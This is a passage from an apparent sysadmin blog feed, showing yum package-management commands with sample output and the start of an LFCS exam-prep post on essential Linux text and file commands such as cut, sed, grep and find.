</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -qd cmdname</span></code></pre></td></tr></table></div></figure>


<h4>yum</h4>

<blockquote><p>Yellowdog Updater Modified</p></blockquote>

<ul>
<li>install automatically</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum install -y pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get info about package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum info nmap
</span><span class='line'> [...]
</span><span class='line'> Available Packages
</span><span class='line'> Name        : nmap
</span><span class='line'> Arch        : x86_64
</span><span class='line'> Epoch       : 2
</span><span class='line'> Version     : 6.40
</span><span class='line'> Release     : 7.el7
</span><span class='line'> Size        : 4.0 M
</span><span class='line'> Repo        : base/7/x86_64
</span><span class='line'> Summary     : Network exploration tool and security scanner
</span><span class='line'> URL         : http://nmap.org/
</span><span class='line'> License     : GPLv2 and LGPLv2+ and GPLv2+ and BSD
</span><span class='line'> Description : Nmap is a utility for network exploration or security auditing.
</span><span class='line'>             : It supports ping scanning (determine which hosts are up), many
</span><span class='line'>             : port scanning techniques (determine what services the hosts are
</span><span class='line'>             : offering), and TCP/IP fingerprinting (remote host operating system
</span><span class='line'>             : identification). Nmap also offers flexible target and port
</span><span class='line'>             : specification, decoy scanning, determination of TCP sequence
</span><span class='line'>             : predictability characteristics, reverse-identd scanning, and more.
</span><span class='line'>             : In addition to the classic command-line nmap executable, the Nmap
</span><span class='line'>             : suite includes a flexible data transfer, redirection, and
</span><span class='line'>             : debugging tool (netcat utility ncat), a utility for comparing scan
</span><span class='line'>             : results (ndiff), and a packet generation and response analysis
</span><span class='line'>             : tool (nping).</span></code></pre></td></tr></table></div></figure>


<ul>
<li>remove pkg</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum remove pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list dependencies</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum deplist cowsay
</span><span class='line'> [...]
</span><span class='line'> package: cowsay.noarch 3.04-4.el7
</span><span class='line'>   dependency: /bin/sh
</span><span class='line'>    provider: bash.x86_64 4.2.46-29.el7_4
</span><span class='line'>   dependency: /usr/bin/perl
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Cwd)
</span><span class='line'>    provider: perl-PathTools.x86_64 3.40-5.el7
</span><span class='line'>   dependency: perl(File::Basename)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Getopt::Std)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Text::Tabs)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Text::Wrap)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(strict)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl-Encode
</span><span class='line'>    provider: perl-Encode.x86_64 2.51-7.el7</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list installed packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum list installed
</span><span class='line'> [...]
</span><span class='line'> yum.noarch                             3.4.3-150.el7.centos            @base    
</span><span class='line'> yum-langpacks.noarch                   0.4.2-7.el7                     @base    
</span><span class='line'> yum-metadata-parser.x86_64             1.1.4-10.el7                    @anaconda
</span><span class='line'> yum-plugin-fastestmirror.noarch        1.1.31-40.el7                   @base    
</span><span class='line'> yum-utils.noarch                       1.1.31-40.el7                   @base    
</span><span class='line'> zenity.x86_64                          3.8.0-5.el7                     @anaconda
</span><span class='line'> zip.x86_64                             3.0-11.el7                      @base    
</span><span class='line'> zlib.x86_64                            1.2.7-17.el7                    @base    </span></code></pre></td></tr></table></div></figure>


<ul>
<li>update all packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum update</span></code></pre></td></tr></table></div></figure>


<ul>
<li>check if updates are available, without updating</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum check-update</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list info about available packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum list python
</span><span class='line'> [...]
</span><span class='line'> Installed Packages
</span><span class='line'> python.x86_64                         2.7.5-48.el7                         @base
</span><span class='line'> Available Packages
</span><span class='line'> python.x86_64                         2.7.5-58.el7                         base
</span><span class='line'> [root@localhost ~]#</span></code></pre></td></tr></table></div></figure>


<ul>
<li>find out which package provides some feature or file</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum provides scapy
</span><span class='line'> scapy-2.3.3-1.el7.noarch : Interactive packet manipulation tool and network
</span><span class='line'>                          : scanner
</span><span class='line'> Repo        : epel</span></code></pre></td></tr></table></div></figure>


<ul>
<li>find packages when you know something about  the package but aren&rsquo;t sure of its name.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum search name</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list package summary</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum info scapy
</span><span class='line'> Available Packages
</span><span class='line'> Name        : scapy
</span><span class='line'> Arch        : noarch
</span><span class='line'> Version     : 2.3.3
</span><span class='line'> Release     : 1.el7
</span><span class='line'> Size        : 983 k
</span><span class='line'> Repo        : epel/x86_64
</span><span class='line'> Summary     : Interactive packet manipulation tool and network scanner
</span><span class='line'> URL         : http://www.secdev.org/projects/scapy/
</span><span class='line'> License     : GPLv2
</span><span class='line'> Description : Scapy is a powerful interactive packet manipulation program built
</span><span class='line'>             : on top of the Python interpreter. It can be used to forge or
</span><span class='line'>             : decode packets of a wide number of protocols, send them over the
</span><span class='line'>             : wire, capture them, match requests and replies, and much more.</span></code></pre></td></tr></table></div></figure>


<ul>
<li>find which package provides an utility</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum provides sealert
</span><span class='line'> Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'> setroubleshoot-server-3.2.27.2-3.el7.x86_64 : SELinux troubleshoot server
</span><span class='line'> Repo        : rhel7-local
</span><span class='line'> Matched from:
</span><span class='line'> Filename    : /usr/bin/sealert</span></code></pre></td></tr></table></div></figure>


<ul>
<li>perform cleaning operations</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum clean
</span><span class='line'> all           dbcache       headers       packages      
</span><span class='line'> cache         expire-cache  metadata   </span></code></pre></td></tr></table></div></figure>


<ul>
<li>Produces a list of all dependencies and  what  packages  provide those  dependencies  for the given packages.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum deplist scapy
</span><span class='line'> package: scapy.noarch 2.3.3-1.el7
</span><span class='line'>   dependency: /usr/bin/python
</span><span class='line'>    provider: python.x86_64 2.7.5-58.el7
</span><span class='line'>   dependency: python &gt;= 2.5
</span><span class='line'>    provider: python.x86_64 2.7.5-58.el7
</span><span class='line'>   dependency: python(abi) = 2.7
</span><span class='line'>    provider: python.x86_64 2.7.5-58.el7</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list configured repositories</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum repolist
</span><span class='line'> repo id               repo name                                           status
</span><span class='line'> base/7/x86_64         CentOS-7 - Base                                      9,591
</span><span class='line'> *epel/x86_64          Extra Packages for Enterprise Linux 7 - x86_64      11,985
</span><span class='line'> extras/7/x86_64       CentOS-7 - Extras                                      227
</span><span class='line'> nux-dextop/x86_64     Nux.Ro RPMs for general desktop use                  1,599
</span><span class='line'> updates/7/x86_64      CentOS-7 - Updates                                     731
</span><span class='line'> repolist: 24,133</span></code></pre></td></tr></table></div></figure>


<ul>
<li>see past transactions</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum history</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list available kernels</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum list kernel
</span><span class='line'> Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-
</span><span class='line'>               : manager
</span><span class='line'> Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast
</span><span class='line'> Installed Packages
</span><span class='line'> kernel.x86_64              3.10.0-514.el7                    @anaconda/7.3      
</span><span class='line'> kernel.x86_64              3.10.0-514.26.2.el7               @rhel-7-server-rpms
</span><span class='line'> Available Packages
</span><span class='line'> kernel.x86_64              3.10.0-693.2.2.el7                rhel-7-server-rpms</span></code></pre></td></tr></table></div></figure>


<ul>
<li>install new kernel and set it as default boot choice</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum --enablerepo=kernelrepo install kernelname</span></code></pre></td></tr></table></div></figure>


<p>Set <code>GRUB_DEFAULT=0</code> to make it default, 1 otherwise</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Fine day for friends. So-so day for \
</span><span class='line'>\ you.                                /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Essential commands]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/24/lfcs-prep-essential-commands/"/>
    <updated>2018-02-24T16:46:53-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/24/lfcs-prep-essential-commands</id>
    <content type="html"><![CDATA[<p>Various commands for the LFCS Essential Commands domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>

<!-- more-->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/cmds.png" title="linux cmds" alt="cmd essentials"></p>

<h4>cut</h4>

<blockquote><p>remove sections from each line of files</p></blockquote>

<ul>
<li>select only relevant fields of output</li>
</ul>


<p>Here I&rsquo;m looking only at users and their home directories from /etc/passwd:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/passwd | cut -d: -f1,6 | tail -n 5
</span><span class='line'>apache:/usr/share/httpd
</span><span class='line'>nixer:/home/nixer
</span><span class='line'>lfcs:/home/lfcs
</span><span class='line'>squid:/var/spool/squid
</span><span class='line'>tom:/home/tom</span></code></pre></td></tr></table></div></figure>


<h4>sed</h4>

<blockquote><p>stream editor for filtering and transforming text</p></blockquote>

<ul>
<li>substitute all occurrences in a file to something else: <code>sed &rsquo;s/original/replacement/flag' filename</code></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat text.txt
</span><span class='line'>Peace is a lie, there is only passion.
</span><span class='line'>Through passion, I gain strength.
</span><span class='line'>Through strength, I gain power.
</span><span class='line'>Through power, I gain victory.
</span><span class='line'>Through victory, my chains are broken.</span></code></pre></td></tr></table></div></figure>


<p>Changed the I to a we and redirect to a new file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sed 's/I/we/g' text.txt &gt; altered.txt
</span><span class='line'>cat altered.txt
</span><span class='line'>Peace is a lie, there is only passion.
</span><span class='line'>Through passion, we gain strength.
</span><span class='line'>Through strength, we gain power.
</span><span class='line'>Through power, we gain victory.
</span><span class='line'>Through victory, my chains are broken.
</span><span class='line'>The Force shall free me.</span></code></pre></td></tr></table></div></figure>


<h4>diff</h4>

<blockquote><p>compare files line by line</p></blockquote>

<ul>
<li>compare files side by side</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>diff -y text.txt altered.txt
</span><span class='line'>Peace is a lie, there is only passion.                Peace is a lie, there is only passion.
</span><span class='line'>Through passion, I gain strength.               | Through passion, we gain strength.
</span><span class='line'>Through strength, I gain power.                     | Through strength, we gain power.
</span><span class='line'>Through power, I gain victory.                      | Through power, we gain victory.
</span><span class='line'>Through victory, my chains are broken.                Through victory, my chains are broken.
</span><span class='line'>The Force shall free me.                  The Force shall free me.</span></code></pre></td></tr></table></div></figure>


<h4>man</h4>

<blockquote><p>an interface to the on-line reference manuals</p></blockquote>

<ul>
<li>search manpages by keyword</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man -k print | head -n 5
</span><span class='line'>fmtmsg (3)           - print formatted error messages
</span><span class='line'>isprint (3)          - character classification routines
</span><span class='line'>iswprint (3)         - test for printing wide character
</span><span class='line'>netstat (8)          - Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships
</span><span class='line'>abrt-action-list-dsos (1) - Prints out DSO from mapped memory regions.</span></code></pre></td></tr></table></div></figure>


<h4>umask</h4>

<blockquote><p>display or set the file creation mask</p></blockquote>

<p>It can be used to remove, but not add permissions</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umask
</span><span class='line'>0022
</span><span class='line'>umask -S
</span><span class='line'>u=rwx,g=rx,o=rx</span></code></pre></td></tr></table></div></figure>


<h4>info</h4>

<blockquote><p>read Info documents</p></blockquote>

<h4>touch</h4>

<blockquote><p>Update the access and modification times of each FILE to the current time</p></blockquote>

<ul>
<li>r FILE &ndash;>  use this file&rsquo;s times instead of current time</li>
</ul>


<h4>whatis</h4>

<blockquote><p>display manual page descriptions</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>whatis ip
</span><span class='line'>ip (7)               - Linux IPv4 protocol implementation
</span><span class='line'>ip (8)               - show / manipulate routing, devices, pol...</span></code></pre></td></tr></table></div></figure>


<h4>apropos</h4>

<blockquote><p>search the manual page names and descriptions</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apropos network | tail
</span><span class='line'>teamnl (8)           - team network device Netlink interface tool
</span><span class='line'>tracepath (8)        - traces path to a network host discoveri...
</span><span class='line'>tracepath6 (8)       - traces path to a network host discoveri...
</span><span class='line'>traceroute (8)       - print the route packets trace to networ...
</span><span class='line'>traceroute6 (8)      - print the route packets trace to networ...
</span><span class='line'>tshark (1)           - Dump and analyze network traffic
</span><span class='line'>umount.nfs (8)       - unmount a Network File System
</span><span class='line'>usernetctl (8)       - allow a user to manipulate a network in...
</span><span class='line'>wget (1)             - The non-interactive network downloader.
</span><span class='line'>wireshark (1)        - Interactively dump and analyze network ...</span></code></pre></td></tr></table></div></figure>


<h4>uniq</h4>

<blockquote><p>report or omit repeated lines</p></blockquote>

<ul>
<li><p>D # print all duplicate lines</p></li>
<li><p>u # only print unique lines</p></li>
<li><p>it won&rsquo;t detect repeated lines unless they are adjacent. Sort first</p></li>
</ul>


<h4>sort</h4>

<blockquote><p>sort lines of text files</p></blockquote>

<h4>fmt</h4>

<blockquote><p>simple optimal text formatter</p></blockquote>

<ul>
<li>u # uniform spacing: one space between words, two after sentences</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@tron ~]# cat test.txt
</span><span class='line'>Test.     Next sentence.   This    doesn't   look       right
</span><span class='line'>[root@tron ~]# fmt -u test.txt
</span><span class='line'>Test.  Next sentence.  This doesn't look right</span></code></pre></td></tr></table></div></figure>


<h4>nl</h4>

<blockquote><p>number lines of files</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nl test.txt
</span><span class='line'>     1    First line
</span><span class='line'>
</span><span class='line'>     2    Second line
</span><span class='line'>
</span><span class='line'>     3    Third line</span></code></pre></td></tr></table></div></figure>


<h4>updatedb</h4>

<blockquote><p>creates or updates a database used by locate(1). It&rsquo;s usually  run daily by cron(8) to update the default database.</p></blockquote>

<h4>tty</h4>

<blockquote><p>print the file name of the terminal connected to standard input</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tty
</span><span class='line'>/dev/pts/1</span></code></pre></td></tr></table></div></figure>


<h4>type</h4>

<blockquote><p>indicate how each name would be interpreted  if used as a command name</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>type ls
</span><span class='line'>ls is aliased to `ls --color=auto'</span></code></pre></td></tr></table></div></figure>


<h4>tree</h4>

<blockquote><p>list contents of directories in a tree-like format</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tree
</span><span class='line'>.
</span><span class='line'>├── anaconda-ks.cfg
</span><span class='line'>├── Desktop
</span><span class='line'>├── Documents
</span><span class='line'>│   ├── archive_file
</span><span class='line'>│   ├── arhive.tar.gz
</span><span class='line'>│   ├── Documents
</span><span class='line'>│   │   ├── archive_file
</span><span class='line'>│   │   └── test.txt
</span><span class='line'>│   └── test.txt
</span><span class='line'>├── Downloads
</span><span class='line'>├── initial-setup-ks.cfg
</span><span class='line'>├── Music
</span><span class='line'>├── openscap_data
</span><span class='line'>│   └── eval_remediate_results.xml
</span><span class='line'>├── Pictures
</span><span class='line'>├── Public
</span><span class='line'>├── Templates
</span><span class='line'>├── test.txt
</span><span class='line'>└── Videos</span></code></pre></td></tr></table></div></figure>


<h4>wc</h4>

<blockquote><p>print newline, word, and byte counts for each file</p></blockquote>

<ul>
<li>l # lines</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l /etc/hosts
</span><span class='line'>2 /etc/hosts</span></code></pre></td></tr></table></div></figure>


<ul>
<li>w # words</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -w test.txt
</span><span class='line'>6 test.txt</span></code></pre></td></tr></table></div></figure>


<h4>grep</h4>

<blockquote><p>print lines matching a pattern</p></blockquote>

<ul>
<li><p>-E # Interpret PATTERN as an extended regular  expression</p></li>
<li><p>-i # ignore case</p></li>
<li><p>-n # prefix each line of output with its line number</p></li>
<li><p>list items that begin with certain PATTERN</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum list installed | grep ^kernel
</span><span class='line'>kernel.x86_64                        3.10.0-514.el7          @anaconda/7.3      
</span><span class='line'>kernel.x86_64                        3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-devel.x86_64                  3.10.0-514.el7          @anaconda/7.3      
</span><span class='line'>kernel-devel.x86_64                  3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-headers.x86_64                3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-tools.x86_64                  3.10.0-514.26.2.el7     @rhel-7-server-rpms
</span><span class='line'>kernel-tools-libs.x86_64             3.10.0-514.26.2.el7     @rhel-7-server-rpms</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list items that end with certain PATTERN</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum list installed | grep x86_64$
</span><span class='line'>NetworkManager-libreswan-gnome.x86_64
</span><span class='line'>iscsi-initiator-utils-iscsiuio.x86_64
</span><span class='line'>libreport-plugin-reportuploader.x86_64
</span><span class='line'>libreport-rhel-anaconda-bugzilla.x86_64
</span><span class='line'>libvirt-daemon-driver-interface.x86_64
</span><span class='line'>libvirt-daemon-driver-nwfilter.x86_64
</span><span class='line'>openlmi-indicationmanager-libs.x86_64
</span><span class='line'>sane-backends-drivers-scanners.x86_64
</span><span class='line'>subscription-manager-initial-setup-addon.x86_64</span></code></pre></td></tr></table></div></figure>


<ul>
<li>grep something that begins and ends with a certain PATTERN, but with variable content in the middle</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -E '^de......tion$' /usr/share/dict/words | head -n 5
</span><span class='line'>deactivation
</span><span class='line'>dealkylation
</span><span class='line'>deallocation
</span><span class='line'>deambulation
</span><span class='line'>deammonation</span></code></pre></td></tr></table></div></figure>


<h4>find</h4>

<blockquote><p>search for files in a directory hierarchy</p></blockquote>

<ul>
<li><p>find / -perm -6000 # find SUID and SGID</p></li>
<li><p>find / -size 10M -type f # find files whose size is 10 megabytes</p></li>
<li><p>type d/c/l/f # directories/character devices/symlinks/files</p></li>
<li><p>user <username> # owned by username</p></li>
<li><p>exec <cmd> &lsquo;{}&rsquo; + # execute cmd on results of the find cmd</p></li>
